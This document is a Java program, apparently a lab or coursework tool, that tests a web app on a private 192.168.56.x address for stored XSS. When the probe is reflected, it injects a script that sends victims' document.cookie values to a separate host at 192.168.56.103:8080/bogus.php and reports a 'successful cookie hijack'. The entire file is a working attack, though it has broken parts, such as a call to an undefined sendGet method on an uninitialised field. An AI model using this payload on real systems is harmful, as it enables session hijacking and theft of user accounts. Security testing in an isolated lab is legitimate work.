
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class VulnerabilityCheck {

    private static HttpURLConnection con;
    private static Scanner input = new Scanner(System.in);
    private static String url , url2;
    private static String urlParameters;
    private static StringBuilder content;
    private static URL myUrl ;
    private static boolean cv = false;
    private static GetURLParameters GUP;
    public static void main(String[] args) throws Exception {

       // System.out.println("plz enter URL with relevant parameters: ");
        //url= input.nextLine();
        url = args[0];
        url2=GUP.sendGet(url);
        url2="http://192.168.56.102"+url2+"/";
        //System.out.println(" url is :"+url2);

        //url= "http://192.168.56.101/peruggia/index.php?action=comment&pic_id=1&postcomment=1";
        //System.out.println("plz enter script with suitable syntax");
        //url = url + "index.php?action=comment&pic_id=1&postcomment=1/";
        //System.out.println(url);
        //urlParameters  = input.nextLine();
        urlParameters = "comment=<script>alert(\"XSS Attacked2\")</script>";

        byte[] postData = urlParameters.getBytes(StandardCharsets.UTF_8);
        urlParameters = urlParameters.split("=")[1];
        myUrl = new URL(url2);

        checkVulnerable(postData);
       // System.out.println(content.toString());

    }

    private static void checkVulnerable(byte[] postData) throws IOException {
        {
            con = (HttpURLConnection) myUrl.openConnection();
            try {

                con.setDoOutput(true);
                con.setRequestMethod("POST");
                //con.setRequestProperty("User-Agent", "Java client");
                //con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");


                try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                    wr.write(postData);
                }



                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(con.getInputStream()))) {

                    String line;
                    content = new StringBuilder();
                    while ((line = in.readLine()) != null) {
                        content.append(line);
                        content.append(System.lineSeparator());
                    }

                }


            } finally {
                con.disconnect();
            }
            if (content.toString().contains(urlParameters) && !cv ){
                System.out.println("xss vulnerable");
                cv = true;
                urlParameters = "comment=<script> new Image().src=\"http://192.168.56.103:8080/bogus.php?output=\"+document.cookie;</script>";
                // System.out.println(urlParameters);
                byte[] postData2 = urlParameters.getBytes(StandardCharsets.UTF_8);
                urlParameters = urlParameters.split("=")[1];
                checkVulnerable(postData2);

            }
            else if(!cv){
                System.out.println("not vulnerable");
            }
            else if (content.toString().contains(urlParameters) && cv){

                System.out.println("successful cookie hijack");

            }
            else{
                System.out.println("unable to hijack cookie");
            }

        }


    }


    public  static String GetURLParameters(String url) {



        return url;

    }
}

